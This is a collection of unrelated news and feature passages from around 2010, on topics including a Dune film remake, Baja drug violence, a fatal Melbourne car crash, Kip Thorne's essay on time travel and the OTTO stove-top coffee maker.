Unfortunately , few data link sodium intake to health outcomes , and that which is available is inconsistent .
Without knowledge of the sum of the multiple effects of a reduced sodium diet , no single universal prescription for sodium intake can be scientifically justified .

Frank Herbert ’s 1965 sci- fi classic heads back to the big screen in a new Dune movie to be directed by Pierre Morel .
The French filmmaker got the gig with Paramount Pictures on the strength of his taut 2009 thriller Taken .
According to Variety , Morel is a hard - core fan of Herbert ’s novel .
The director will fine - tune a script by Peter Berg , who split the project to take on Hasbro board game adaptation Battleship .
Producing the picture is New Amsterdam ’s Richard Rubenstein , who also handled the TV movie version of Dune and its Children of Dune sequel .
In 1984 , David Lynch took a love - it - or - hate - it crack at Herbert 's saga about an outer - space showdown on the desert planet of Arrakis .
Are you optimistic about Hollywood 's upcoming take on Dune , or is Herbert 's story best confined to the printed page ?

IDF sources noted that while this attempt is not an unusual occurrence , it nonetheless points to continued efforts by terror groups to transfer explosives from one place to another for use in attacks .
" Pipe bombs may be primitive devices , but they can certainly cause harm , " the sources said .
They also noted that the use of such devices reflects the difficulty terror groups are experiencing in producing more sophisticated devices .
" Pipe bombs , by nature , cannot carry a large amount of explosives .
At a time when it is hard to make larger devices and transfer them to various places , we are likely to see more devices of this kind . "

While the situation has been calmer recently , attempts are still being made to carry out attacks .
On Friday , an indictment was filed against Rami Abu Dia , 27 , resident of Bitunia , near Ramallah , who is accused of attempting an attack near the Western Wall two weeks ago .
Abu Dia 's detailed plan for the attack is included in the indictment .
He intended to grab his victim by the neck and stab him in the chest .
For this purpose , he bought an 18 cm ( 7 inch ) knife in Ramallah .
He had first planned to stab soldiers at a checkpoint , but due to defensive measures at the checkpoint he retreated .
Later he managed to get inside Israel and was caught on his way to the Old City .

Sauber has become the first Formula 1 team to set its 2010 launch date , having announced that it will reveal its new car at the Valencia circuit on Sunday 31 January .
The squad will hold its launch on the eve of the first pre-season test , which takes place at the Spanish track from 1 - 3 February .
The Formula One Teams ' Association ( FOTA ) had originally hoped that all 13 teams could reveal their 2010 cars in a single launch event , but this plan had to be shelved on logistical grounds .
Founder Peter Sauber has reclaimed ownership of his team for 2010 following BMW 's withdrawal and the abortive Qadbak takeover , although it is still using BMW Sauber F1 Team as its official title at present .
BMW 's departure has led to staff reductions at Sauber , and a switch to Ferrari engines .
The team has signed ex-Toyota man Kamui Kobayashi as its first driver but is yet to announce who will occupy its second cockpit .
This week , the FBI released a " digitally - altered " image showing what Osama Bin Laden possibly looks like now that he 's older .
While the FBI claims to have used " cutting - edge " technology to create the image , a Spanish politician has noticed that the poster is a modified version of his campaign photo — he now finds his face in America 's most wanted list .
While on the surface it's an amusing misstep by intelligence agencies , Gaspar Llamazares , the former leader of Spain 's United Left coalition , calls the move " shameless . "
His safety is at risk , he told the BBC , and he no longer feels able to travel to America now that his likeness is on a wanted poster : " Bin Laden 's safety is not threatened by this but mine certainly is , " Llamazares said .
\
Left , Bin Laden in 1998 ; middle , the FBI image ; right , Gaspar Llamazares
The FBI is quoted admitting to the error , saying that the artist found the photo on the web and did n't know it was of a Spanish politician :
" When producing age - progressed photographs , forensic artists typically select features from a database of stock reference photographs to create the new image ... it appears that in this instance the forensic artist was unable to find suitable features among the reference photographs and obtained those features , in part , from a photograph he found on the Internet .
The forensic artist was not aware of the identity of the individual depicted in the photograph .
The similarities between the photos were unintentional and inadvertent . "
We do n't think it matters that the man in question was a notable politician :
Using photos from an image search to create a most wanted poster is surely putting the subject at risk , is it not ?
For 30 years , Oscar Saldivar has earned his living at L.A. construction sites .
Every Friday afternoon , his weekend wind - down begins with a long drive south .
He leaves his Norwalk home , travels through Orange County and San Diego , crosses the international border , then passes a couple of military checkpoints manned by men in Kevlar shells armed with machine guns .
Finally , he arrives at his six - bedroom vacation house in the Baja town of Rosarito .
If he ’s lucky , he gets there in time to catch the flaming orange sun disappear over the horizon .
“ We have spectacular views , ” Saldivar told me .
“ And it ’s like a small town where everyone knows each other and is really friendly . ”
The Baja coast is a Mexican Malibu , a place where a blue - collar guy from L.A. can build a palace overlooking the Pacific .
Only one bit of ugliness taints this accessible slice of paradise : the drug wars .
“ You go there and you know you ’re in the fire , ” Hernan Sosa , a 45 - year - old welder from Rosemead , told me in Spanish .
“ You feel it .
At any moment , something bad could happen . ”
Which is the real Mexico and the real Baja , I wondered .
The peaceful getaway or the lawless frontier ?
Everyone who loves Mexico is torn and confused these days about what ’s going on there .
Even Saldivar and Sosa , friends who travel to Baja most weekends .
I met them in Norwalk just before their weekly Wednesday night poker game .
I wanted to ask them if -- given recent events -- they were still heading out to their Baja homes on Friday .
Jesus Velasquez , a 51 - year - old meat seller from South Gate , answered yes .
“ I ’m going to retire there , ” he said .
“ And I ’m going to live there until I die because it ’s the most beautiful place on Earth . ”
It ’s during the winter holidays that Mexico ’s enchantments call out loudest to L.A. families with roots there .
Last month , Agustin Roberto “ Bobby ” Salcedo went with his wife to her hometown , Gomez Palacio , in the state of Durango .
On Dec. 30 , the El Monte educator was kidnapped and executed with five other men in a ditch outside of town .
Close to home
Mexican L.A. knows the Salcedo story well now .
Born in the United States , Bobby was the son of immigrants from Jalisco , Mexico , and served his people on both sides of the border .
He married a Mexican woman , was elected to office in the United States and led a group that provided aid to his wife ’s hometown .
Immigrant families look at the Salcedos and see the best of themselves .
Bobby ’s slaying makes them feel angry and impotent .
His name makes the conversation of the poker friends take an angry turn .
“ The problem is that we Mexicans are cowards , ” Saldivar said .
His countrymen , he said , are too passive and fearful before the power of drug - financed gangs .
Saldivar came to the United States as a teenager and is 47 now .
Like Salcedo ’s parents , he is a native of Jalisco .
Now he has dual U.S. and Mexican citizenship .
“ In Mexico , we expect the government to take care of everything , ” he told me .
“ But it ’s the people who have to take charge of the situation . ”
Saldivar has learned that lesson living in California .
Citizens here denounce criminal activity to the authorities -- whether it ’s a drug dealer or a corrupt official -- even if it means doing so anonymously , he said .
I ’ve known Saldivar for about a year .
He ’s a smart guy who ’s active in Norwalk city politics .
Once a construction worker , he now owns his own business as a licensed contractor .
“ That ’s a nice speech , Oscar , ” I said when he had finished .
“ But are you still going to go to Baja on Friday ? ”
“ Of course , ” he said .
Saldivar ’s not afraid of going to Baja because he thinks he ’s immune to Mexico ’s drug - related violence .
“ El que nada debe , nadie teme , ” he told me in Spanish , a folk saying that translates loosely as , “ He who owes no one , fears no one . ”
If you live apart from the nefarious drug business , in other words , it wo n’t touch you .
Most people in Mexico think this way about the drug wars .
It ’s as if all that killing were taking place in another dimension .
There are no “ innocent ” victims because the dead are all either “ narcos ” or law enforcement officials who know the risks involved in fighting them .
My own experience covering the drug wars in Latin America tells me this is a myth .
What ’s going on down there is n’t really a “ war . ”
The drug trade is a plague that can touch any family .
Powerful force
Imagine a territory where a small minority of the greediest and most unprincipled people have suddenly been given the power of life and death over everyone else .
The drug trade , with its unimaginable sums of cash , attracts a few intelligent people willing to make a bargain with the devil .
But most of its foot soldiers are dumb , desperate guys making rash decisions .
That ’s why a good person such as Bobby Salcedo can fall into its web .
“ Of course a stray bullet could find you , ” Saldivar told me as we discussed Salcedo ’s death .
“ But that could happen anywhere .
It happens here in L.A. too . ”
Another friend at the poker table agreed .
“ Tell people they should still go to Rosarito , ” Velasquez told me .
“ It ’s safe there . ”
But Sosa , the welder , disagreed .
“ There ’s no security in Mexico , ” he said .
“ We think things are safe as long as nothing happens to us .
But the truth is we ’re lucky . ”
“ I ’ve been going for 30 years and nothing ’s ever happened to me , ” Saldivar said .
Actually , that is n’t quite true .
Saldivar ’s life has been touched by the drug trade more than once .
A year ago , his teenage godson committed suicide in Long Beach after battling addiction to crystal meth .
And a few years back , his son , then 12 , was approached by crack dealers just a block from their Rosarito vacation home .
Saldivar undertook a months - long campaign to force the local government to increase police patrols .
He was so insistent that state officials eventually called in the army .
The drug dealers went elsewhere .
Now , Saldivar , told me , he ’s going to start going to law school in Tijuana on the weekends .
“ I want to help make things better over there , ” he said .
“ It ’s never too late to get started . ”
Saldivar ’s relationship to his Mexican paradise is a complicated one .
He and his friends will keep telling everyone Baja really is -- or can be -- as peaceful as it looks .
At the same time , making a stop at Tijuana law school is Saldivar ’s own way of protesting that things in Mexico have to change .
Velasquez says he hopes one day Saldivar will run for mayor of Rosarito .
Until then , he ’ll keep on going to his Baja home .
It is 3,500 square feet , and when he goes there , he feels like a king .
“ Come and visit it us , ” he tells me , “ and we ’ll barbecue a nice rib - eye steak for you . ”
I supposed you have to love a place before you can fight for it .

Manuel Noriega has remained in US custody after serving 17 years
The US Supreme Court has refused to hear an appeal from Panama 's ex-leader Manuel Noriega against his extradition to France on money laundering charges .
Noriega wanted to be sent back to his country after completing a drug sentence at a jail in Florida .
In April , a US court ruled the former dictator could be extradited to France .
The US convicted Noriega of laundering illicit drugs money in 1990 and he was sentenced to 30 years , later reduced to 17 years for good behaviour .
France convicted him in his absence in 1999 for laundering money through French banks , though it says he will be granted a new trial .
His lawyers had argued international law required he be returned to Panama .
As a former prisoner of war following the US invasion of Panama in 1989 , they said , the Geneva Conventions precluded his extradition to a third country .
He also faces a 20 - year sentence at home imposed by a Panamanian court in his absence for ordering the murder in 1985 of Hugo Spadafora , a prominent opponent .
Noriega , who is in his 70s , led Panama in the mid- to late 1980s and was a key American ally in the region before being captured by invading US forces .
He has remained in US custody ever since the completion of his 17 - year US prison term , pending his appeal against extradition .
The head of the intelligence services in the United States has vowed to make amends after stinging criticism from President Obama that they failed to stop last month 's attempt to bomb an American airliner .
In a statement the National Intelligence director , Dennis Blair , said the intelligence community needed to boost efforts to anticipate new kinds of attacks .
After an earlier meeting with his security advisers , President Obama said US intelligence services had enough information to place the Nigerian suspect , Umar Farouk Abdulmutallab , on a no - fly list , but had failed to connect the dots , adding : " That 's not acceptable , and I will not tolerate it " .
Janice Kephart is director of National Security Studies at the Center for Immigration Studies in Washington and served as counsel on the 9/11 commission .

The mangled remains of Steven Johnstone 's ( inset left ) Ford Falcon .
Among the five people also killed were Anthony Iannetta , Mathew Lister and Ben Hall .

According to his girlfriend , Johnstone sped off in anger .
Some gatecrashers ran after him while others piled into another car and drove off in pursuit , she said .
The apprentice roof tiler was in the car with Will - who friends say wanted to be a rapper and loved the late US artist Tupac - and mates Mathew Lister , 17 , Ben Hall , 19 , and Anthony Iannetta , 18 , and his sister , Elissa , 15 , the only survivor .
Police Deputy Commissioner Ken Lay said Johnstone , 19 , had been seen driving at 150 km / h through Ivanhoe with a passenger hanging out the window .
'' The driver was a P - plater , we believe , he had a prior conviction for a high speed in the past year - he should not have had passengers in the car , '' Mr Lay said .
Distraught friends and family gather at the scene of yesterday ’s single - vehicle crash in Mill Park , which left five teenagers dead and injured a girl .
Credit : Paul Rovere '' This was an absolute tragedy waiting to happen . ''
Tony Chahine and his distraught wife thought the same thing as the Ford passed them '' like a rocket ' ' near Hungry Jack 's on Plenty Road just before 2 am .
'' I 'm shivering as I knew these boys were going to a death trap but we could do nothing , '' said a tearful Mrs Chahine , who did not want her first name used .
'' We felt the wind of the car .
I 'm so sad for these young people .
I feel sorry for the parents . ''
Shortly after the car hurtled through the intersection of Childs Road and Plenty Road at Mill Park , the driver lost control and slid off the road into a large oak tree , the impact splitting the metre - wide trunk in half .
After hearing what sounded like a huge explosion , Sam Dunn and Adam Memery looked over their back fence to a scene of carnage .
'' There was no noise - that was the scariest part , '' said Mr Dunn .
'' There was no scream .
It was a mess - there was nothing you could do . ''
Another neighbour , Ang Cannon , said : '' We get a lot of them racing along here on Friday and Saturday nights as it's such a straight road - it's not the first time there 's been an accident .'' .
The three ferried buckets of water to motorists who had stopped to help to put out a fire in the remains of the engine .
Other drivers were still hooning past the scene with some stopping to film it on their mobile phones , Ms Dunn said .
After the fire was out , they could only see the hand and head of the girl in the back and could not tell how many had perished .
Veteran paramedic Ron McLeod said even seasoned emergency workers were traumatised by the accident .
'' I 've been a paramedic for 30 years and and this is the most horrific scene I 've ever seen , '' he said .
It took 90 minutes to free Elissa Iannetta from the wreckage where she was trapped under the bodies of her brother and his mates .
At Royal Melbourne Hospital , where Elissa was last night in a serious but stable condition , her mother Rose said Elissa 's last memory of her brother was of him trying to shield her .
'' He grabbed her and threw her in between his lap to protect her because he could feel it coming , '' she said .
By 10 am yesterday , police had removed the car wreckage , and the broken remains of the oak tree had been mulched and carted away .
All that was left was a gaping hole where the tree had been and debris from the car and its occupants ' young lives .
Playing cards were scattered , along with smashed CDs including a copied version of Michael Jackson 's Dangerous , a pink make - up case , a doll , a white headband , a P - plate and a crumpled box that had once held pre-mixed vodka drinks .
When the first grieving friends began to arrive after 11 am , they stared at the scene in disbelief and tried to ignore the blood stains .
A nearby tree became a memorial after Taryn , 16 , laid the first flowers for her friend , Anthony , known as ' ' Jockey ' ' for his small stature .
'' He was like my family , my brother , '' she said .
'' He was one of the best people you 'd ever meet .
He just liked partying . ''
The stepmother of Steven Johnstone , Jacqueline Johnstone , arrived with his stepbrother , Scott , 9 , to comfort his young friends .
Still in shock , she said he had visited her only hours before the accident .
'' He was a loving boy who had been through a lot of problems , '' she said .
He had lost his father to cancer three years ago .
Gemma Walters was upset and angry that her friends ' lives had been cut short .
' ' I think it 's not fair that they lost their lives at such a young age , '' she said between sobs .
'' Anthony was just one of the best people I 've ever met and a beautiful person and he did n't deserve to die . ''
She said '' Jockey ' ' was part of a large group of close - knit friends .
'' This should show everyone in our whole group that they should n't be driving that fast , that 's stupid to do that , '' she said .
'' Drugs , alcohol and people trying to be heroes . ''
Last night , teenagers kept a candlelight vigil at the site .
About 20 people gathered around a tree covered with flowers and messages of condolence .
The crash came just weeks before Mathew Lister was due to celebrate his 18th birthday with his twin brother on February 5 .
He liked to work on cars and motorbikes , which he enjoyed riding .
'' Mathew was always caring towards his family and close mates , '' his family said in a statement .
'' I hope this tragic accident is a warning that it can happen to you , no matter who you are . ''
By mid-afternoon , the crowd of mourners numbered 150 and tempers began to fray with some young men threatening television cameramen .
The group formed a circle around the makeshift memorial on an oak tree and hugged and cried .
A man handed around bourbon drinks while others pulled out spray cans and scrawled their grief on the footpath and tree stump .
On Facebook , the social networking website , hundreds of friends yesterday reflected on the young lives lost .
Loading A friend of Mathew's , known as Bryce '' Ricardo ' '
Meeks , summed up the sentiment : '' 5 minutes of facebook silence for the 5 boiz we lost at 5 pm do it to let it be known how loved all the boiz where and speeding is n't worth the pain and loss . ''
With PAUL MILLAR
Kip Thorne
In brief :
The laws of physics allow members of an exceedingly advanced civilisation to travel forward in time as fast as they might wish .
Backward time travel is another matter ; we do not know whether it is allowed by the laws of physics , and the answer is likely controlled by a set of physical laws that we do not yet understand at all well : the laws of quantum gravity .
In order for humans to travel forward in time very rapidly , or backward ( if allowed at all ) , we would need technology far far beyond anything we are capable of today .
Travelling forward in time rapidly
Albert Einstein 's relativistic laws of physics tell us that time is " personal " .
If you and I move differently or are at different locations in a gravitational field , then the rate of flow of time that you experience ( the rate that governs the ticking of any very good clock you carry with you and that governs the aging of your body ) is different from the rate of time flow that I experience .
( Einstein used the phrase " time is relative " ; I prefer " time is personal " . )
Example of Twins Paradox Florence rides in a space ship that accelerates outward from Earth on a straight line with one Earth gravity of acceleration , for a time ( as measured by her ) , then decelerates at for a time , winding up at rest relative to Earth but very far away .
Florence then accelerates back toward Earth at for a time and decelerates at for , winding up at rest on Earth .
When the trip is finished and Florence meets her Earth - bound twin Metheuselah , she has aged by while he has aged by a larger amount , .
A fairly simple calculation ( see [ 7 ] ) using the laws of special relativity gives the following expression for Methuselah 's aging in terms of Florence 's :
Here is the exponential function and is the speed of light ( about 299.8 million m/s ) .
This relationship is plotted in the following figure : Click here for a larger version of the graph .
Hereis the exponential function andis the speed of light ( about 299.8 million m/s ) .
This relationship is plotted in the following figure :
If Florence 's clocks and aging report a round trip time of 10 years , Methuselah will have aged by 25 years .
If Florence aged 30 years , Methuselah will have aged 4,500 years .
If Florence aged 88 years , Methuselah will have aged 14 billion years , which is the current age of our Universe !
Unfortunately , no known rocket fuel , not even thermonuclear fusion , is capable of producing the sustained multi- year - long acceleration required for such a trip .
This personal character of time allows one person to travel forward in time much faster than another , a phenomenon embodied in the so - called twins paradox .
One twin ( call him Methuselah ) stays at home on Earth ; the other ( Florence ) travels out into the Universe at high speed and then returns .
When they meet at the end of the trip , Florence will have aged far less than Methuselah ; for example , Florence may have aged 30 years and Methuselah 4,500 years .
( The twin that ages least is the one who undergoes huge accelerations , to get up to high speed , slow down , reverse direction , then accelerate back and slow to a halt on Earth .
The twin who leads the sedate life ages the most . )
A massive black hole is another vehicle for rapid forward time travel :
If Methuselah remains in orbit high above the event horizon of a massive black hole ( say , one whose gravitational pull is that of a billion suns ) and Florence travels down to near the event horizon and hovers just above it for , say , 30 years and then returns , Methuselah can have aged thousands or millions of years .
This is because time flows much more slowly near a black hole 's event horizon ( where the acceleration of gravity is huge ) than far above it ( where one can live sedately ) .
These time travel phenomena have been tested in the laboratory .
Muons — short - lived elementary particles — travelling around and around in a storage ring at 0.9994 of the speed of light , at the Brookhaven National Laboratory on Long Island , New York , have been seen to age 29 times more slowly than muons at rest in the laboratory .
And atomic clocks on the surface of the Earth have been seen to run more slowly than atomic clocks high above the Earth 's surface — more slowly by about 4 parts in 10 billion .
Travelling backward in time : chronology protection
We physicists have been working hard since the late 1980s to understand whether the laws of physics allow backward time travel .
We do not have a definitive answer yet , but the likely answer has been summarised by Stephen Hawking , in his Chronology Protection Conjecture ( see [ 1 ] ) :
The laws of physics always conspire to prevent anything from travelling backward in time , thereby keeping the Universe safe for historians .
We physicists have identified two mechanisms that might protect chronology : ( 1 ) The exotic material that is required in the manufacture of any time machine might be forbidden to exist , by the laws of physics — forbidden to exist in the large amounts that time machines always require .
( 2 ) Time machines might always self - destruct , explosively , when one tries to activate them .
These mechanisms ( 1 ) and ( 2 ) are descriptive translations of mathematical results that we physicists have derived using the laws of physics expressed in their own natural language : mathematics .
The sentences ( 1 ) and ( 2 ) capture the essence of our calculations , but crucial details are lost in translation .
For anyone who wishes to struggle to understand those details , good places to start are a recent beautiful but highly technical review article by John Friedman ( see [ 2 ] ) , and a much less technical but older and slightly outdated article by Matt Visser ( see [ 3 ] ) .
I shall illustrate these chronology - protection mechanisms by an example of a time machine that my students Mike Morris and Ulvi Yurtsever and I invented and explored mathematically in 1989 : a time machine based on wormholes .
( This is just one of many time - machine designs that have been studied .
For others see Visser 's review , [ 3 ] )
Me crawling through a wormhole whose length is only a few centimetres but circumference is about that of my belly .
( From my book Black Holes and Time Warps , [ 4 ] , where you can find a more detailed description of this time machine . )
A wormhole - based time machine : A wormhole is a hypothetical tunnel through hyperspace that links one place in our Universe ( e.g. my office at Caltech ) to another place ( e.g. the Caltech football field ) .
Each end of the wormhole ( each mouth ) looks like a crystal ball .
Staring into it , one sees a distorted image of objects at the other end .
Looking into the mouth in my office , I see the football field , distorted ; someone on the football field , looking into the mouth there , sees me and my office , distorted .
The wormhole ( tunnel ) might be only 3 metres long , so if I enter the mouth in my office and then travel just 3 metres through the tunnel , I emerge from the other mouth , onto the football field 300 metres from my office .
A wormhole as viewed from a higher - dimensional hyperspace .
Our Universe is the two - dimensional sheet .
The wormhole is a short cut through hyperspace from one location in our sheet ( our Universe ) to another .
Suppose , now , that a creature from an extremely advanced civilisation carries the football - field mouth out into the Universe on a " twins paradox " trip .
When that mouth returns , it may have aged by only one second while the mouth in my office aged by one day .
The wormhole has become a time machine :
If I enter one mouth and travel through it for only a few seconds , I emerge from the other mouth one day in the future .
Travelling through it in the other direction , I emerge one day in the past ! ( See [ 4 ] . )
Exotic Matter and Vacuum Fluctuations :
We do not know whether the laws of physics permit wormholes .
We do know , however , that a wormhole will implode so quickly that nothing can traverse it , unless it is held open by gravitationally repulsive forces that can only be produced by exotic matter .
By the phrase " exotic matter " I mean matter that has negative energy and therefore anti-gravitates , i.e. repels .
The quantum laws of physics do permit exotic matter to exist , and it has been created in the laboratory in very tiny amounts : in the so - called Casimir vacuum between two electrically conducting plates , and in the so - called squeezed vacuum that is generated by optical physicists using nonlinear crystals .
The key to this negative energy is the fact that empty space ( the vacuum ) is filled with tiny fluctuations of all kinds of matter and fields that exist in the Universe .
It is impossible to make these fluctuations go away .
They are a consequence of the quantum mechanical uncertainty principle : if , at one moment of time , there are no fluctuations at all of ( for example ) the electromagnetic field , then the rate of change of the fluctuations must be infinitely large and a moment later the fluctuations will be enormous .
The product of the strength of the fluctuations and the magnitude of their rate of change is always bigger than a certain limit , given by the uncertainty principle .
As a result , fluctuations are always present .
We call them vacuum fluctuations because they are a property of the vacuum , i.e. of otherwise empty space .
The Casimir Vacuum :
When two electrically conducting plates are placed very close together , the vacuum fluctuational electric field parallel to the plates is strongly suppressed while that perpendicular to the plates is little affected .
The suppression reduces the fluctuational energy between the plates below what it would be in plate - free empty space , so the vacuum between the plates ( the Casimir vacuum ) acquires negative gravitating energy .
It has loaned some fluctuational energy to the electric fields inside the plates .
The plates have catalysed this lending .
Wormhole held open by Casimir Vacuum :
Two concentric spherical conducting plates are placed at the throat of a wormhole , with a tiny separation .
( One dimension is suppressed here , so our Universe is a 2 - dimensional sheet and the plates look like circles rather than spheres . )
If the plates ' energies ( including their mass 's energy E=mc2 ) are small enough , then the repulsive gravity due to the Casimir vacuum between the plates can hold the wormhole open .
The laws of quantum physics say that vacuum fluctuations produce no gravity — or perhaps only an exceedingly tiny amount of gravity : the gravity that is accelerating the expansion of the Universe .
In other words vacuum fluctuations may be responsible for the so - called cosmological dark energy .
But that dark energy is so tiny ( 10 - 121 in dimensionless numbers ) that it is irrelevant for my discussion of time machines ; so I shall say that the quantum fluctuations produce no gravity at all .
Or , rather , they produce no gravity under normal circumstances .
One can devise ways , in fact , to make one region of empty space lend some of its vacuum fluctuations to an adjacent region .
( This is what experimental physicists do with the Casimir vacuum and with the squeezed vacuum . )
When this happens , the lending region is left with a negative amount of gravitating energy , and the borrowing region gets positive gravitating energy .
The quantum laws place tight constraints on the amount of fluctuational energy that can be loaned .
The larger the size of the lending region , the less energy it can loan and therefore the less negative its energy can become .
This is true in the Casimir vacuum , in the squeezed vacuum , and in all other variants of exotic matter .
The laws of physics dictate it .
These constraints on the amount of negative gravitating energy might be severe enough to prevent one from ever accumulating enough of it to prevent a wormhole from imploding ( see [ 5 ] ) .
The reason is that regions of space which do the borrowing and the devices which catalyse the borrowing might always have so much positive energy of their own , that their attractive gravity counteracts the negative energy 's repulsive gravity , and triggers all wormholes to implode .
If that is the case , then wormhole - based time machines are forbidden : one can never travel through a wormhole before it implodes .
( John Friedman and colleagues have called this topological censorship , see [ 2 ] . )
My personal guess is that these constraints on exotic matter do not prevent wormholes from being held open and thus do not protect chronology , but I could well turn out to be wrong .
To learn the truth , we physicists must develop a deeper understanding of quantum theory in warped spacetime than we now have — i.e. a deeper understanding of the combined laws of quantum theory and general relativity , the laws of quantum gravity .
Time machine self destruction :
If it turns out that wormholes can be held open , then doing so is not enough to guarantee that an ultra- advanced civilisation can convert a wormhole into a time machine via a twins - paradox trip ( carrying one mouth out into the Universe at high speed and then back ) .
There is a second obstacle that must be surmounted — time machine self destruction :
Time machine self destruction :
As the right wormhole flies back toward the left , at the end of its twins - paradox trip , vacuum fluctuations flow through the wormhole then out through the space between them , returning to their starting point at the moment they left .
Their gravitating energy grows extremely large , and perhaps destroys the wormhole at the moment it becomes a time machine .
( Figure adapted from my book Black Holes and Time Warps , [ 4 ] . )
As the travelling mouth is returning to Earth , there comes a first moment when its wormhole can be used to travel backward in time .
The first thing that can do so , and thereby meet itself before it left , is an entity that enters one mouth , exits from the other before it entered , and then flies through the Universe back to its starting point at the highest possible speed , the speed of light — arriving back at the first mouth at precisely the moment it started its trip .
Even if no light or other light - speed radiation travels on this round - trip time - travel route , vacuum fluctuations will always do so .
They can not be stopped .
Upon arriving back at their starting point at the very moment when they left , the vacuum fluctuations will pile up on top of their younger selves .
The result is a duplicate of every fluctuation , and then , with another round trip , a quadrupling of every fluctuation , and so forth .
The bottom line , according to a calculation that I did with my postdoc Sung - Won Kim in 1990 , is an explosive flow of gravitating fluctuational energy through the wormhole at precisely the moment when time travel is first possible — at the moment of time machine activation [ 4 ] .
Will this explosive fluctuational energy destroy the wormhole and thence the time machine ?
At first Kim and I thought the wormhole could survive .
However Stephen Hawking gave strong arguments to the contrary , in his seminal 1991 research paper on chronology protection .
The explosion is very likely to destroy the time machine when it is first activated , Hawking argued — and not just this time machine , but any time machine that even the most advanced civilisation might conceive and build .
Over the next few years many other physicists weighed in , with analyses of other time machine designs , and it began to look like Hawking might be wrong : a sufficiently clever design might protect a time machine from self destruction .
Then in 1996 Bernard Kay , Marek Radzikowski and Robert Wald developed a powerful mathematical proof that the version of the laws of quantum physics which we were all using to analyse time machine self destruction are incapable of revealing the explosion 's outcome .
The outcome is held tightly in the grip of the laws of quantum gravity , which we do not yet understand fully .
The fate of any time machine ?
Hawking and I have a long history of bets with each other , about unsolved mysteries in physics .
But we are not making a bet on this one , since for once we are on the same side .
When we physicists have mastered the laws of quantum gravity ( Hawking and I agree ) , we will very likely discover that chronology is protected : the explosion always does destroy any time machine , when it is first activated .
In June 2000 , on the occasion of my 60th birthday , Hawking presented me with a tentative analysis of the explosion 's outcome , using his own tentative version of the laws of quantum gravity .
His conclusion : if I try to use a very advanced civilisation 's wormhole to travel backward in time , the quantum mechanical probability that I will succeed is one part in 1060 ; see Hawking 's article in my birthday party book , [ 6 ] .
That 's an awfully small probability of surviving the explosion .
Given the opportunity to try , I would not take the risk .
Other time machines :
It is amazing what we can learn from the laws of physics , when we understand them well .
One famous example is the laws ' absolutely firm insistence that it is impossible to construct a perpetual motion machine , even if one has all the tools of an exceedingly advanced civilisation .
Another example is a proof by Hawking that to make a time machine , no matter how one goes about it , one must use exotic matter — matter with negative energy — as an integral part of the device ; wormholes illustrate this , but it is true in general .
And a third example is the proof by Kay , Radzikovsky and Wald that the laws of physics as we now know them will break down whenever a time machine is activated , no matter how one designs the machine .
Again wormholes are just one example .
Hawking 's theorem , and that of Kay , Radzikovsky and Wald , tell us that the fates of all time machines are held tightly in the grip of the laws of quantum gravity .
Progress in the quest to understand quantum gravity has been substantial over the past two decades .
Complete success will come , I am convinced , within the next two decades or so — and it will bring not only a clear understanding of whether backward time travel is possible , but also an understanding of many other mysteries , including how our Universe was born ( see the Plus article What happened before the Big Bang ? ) .

He worked with industrial design company Tiller Design , which consulted a mathematician to develop a brewing system that could harness enough pressure from a stove - top to deliver the type of coffee Hiron wanted to drink .
A fluid - delay valve was used to control the temperature , timing and flow of water and steam before and during coffee extraction and milk steaming .
Other stove - tops usually send the water through the coffee once it has reached boiling point , which can result in a burnt taste .
Unlike aluminium stove - tops , OTTO is cast from stainless steel and weighs more than four kilograms .
While more durable and hygienic , the thick base also makes for a slow caffeine fix .
OTTO takes between six and 10 minutes to extract 60 millilitres of coffee , or two espresso - style shots .
Those who want to press a button or satisfy hordes of dinner party guests need not apply .
The signs are beginning to look positive for Hiron ?
not just in Sydney and Melbourne , where a few hundred OTTOs have sold since August .
Traffic on the global coffee blogosphere is growing .
Forums anchored in places as far - flung as British Columbia are debating the merits of a machine that has so far had just one production run of 1000 .
The owner of The Brunswick East Project , Marinus Jansen , has bought 11 OTTOs , sold six and given one to his wife .
" We were sceptical , " Jansen admits .
But he swears the coffee OTTO produces is similar to espresso ( technically , espresso is extracted using at least nine - bar pressure , and OTTO musters three to four - bar ) .
Microbiologist and food blogger Emily Hart bought her first stove - top after watching Hiron demonstrate OTTO to customers at The Brunswick East Project .
" I 've always found stove - top coffee long and watery ?
whereas this was like an espresso : dense and rich and smooth , " Hart recalls .
Is she having the same success at home ?
It took varying levels of heat and different grinds ( she settled on a grind finer than espresso ) before Hart felt confident she was heading in the right direction .
" But being able to play around with it is something I really like , " she says .
If OTTO needs to pass a test , perhaps fellow Brunswick East Project patron Jonathan Lynch is it .
" I 'm considerably fussier than your average punter , " he says .
" There are only four to five places in Melbourne where I can buy a cup of coffee that I consider as good , or better , than I can make at home . "
Lynch , who says it took him a year to produce a coffee with which he was satisfied on his home espresso machine , already favours OTTO .
" It 's the texture of the coffee , particularly if you 're drinking an espresso shot , " he says .
" I think it 's because OTTO extracts under less pressure than most commercial machines .
If you get the grind right , it has the texture of cream .
It 's just exquisite . "
Criticism has focused on a near mirror - replication of the Atomic 's iconic looks .
Swinburne University academic Roger Simpson questioned OTTO 's recognition by the Australian International Design Awards , calling it " unimaginative " .
Hiron says it was never his intention to reinvent the wheel but to create a re-imagination of one of the world 's great coffee machines .
And criticism , even from aficionados of the Atomic , has been muted .
Tony Richardson is the author of the only book specifically about the Atomic .
He describes OTTO as " a salute " to the Atomic , " but it is also very different in what it produces and how it does it " .
Richardson says fellow Atomic fans report OTTO 's coffee is " somewhere between the very mild product of the Atomic and the fashionable , stronger brew from a modern 15 - bar machine " .
Oddly , Hiron has found OTTO 's looks are an obstacle .
" People think it looks pretty but my biggest problem is making sure it 's taken seriously . "
He has targeted specialist coffee stores and high - end kitchenware retailers , pounding the pavement to ensure those selling OTTO see their role as " educators " rather than retailers .
Hiron says the message must be : " There is a way of extracting an entirely different style of coffee from a stove - top . "
He says he could have poured his time , energy and money into a cheaper product with more appeal : " But I 'm too passionate .
I want to succeed doing something properly , without compromise . "

WASHINGTON 
The deaths of seven Central Intelligence Agency operatives at a remote base in the mountains of Afghanistan are a pointed example of the civilian spy agency ’s transformation in recent years into a paramilitary organization at the vanguard of America ’s far - flung wars .
Even as the C.I.A. expands its role in Afghanistan , it is also playing a greater role in quasi-military operations elsewhere , using drone aircraft to launch a steady barrage of missile strikes in Pakistan and sending more operatives to Yemen to assist local officials in their attempts to roll back Al Qaeda ’s momentum in that country .
The C.I.A. operatives stationed at Forward Operating Base Chapman in Khost Province , where Wednesday ’s suicide bombing occurred , were responsible for collecting information about militant networks in Afghanistan and Pakistan and plotting missions to kill the networks ’ top leaders .
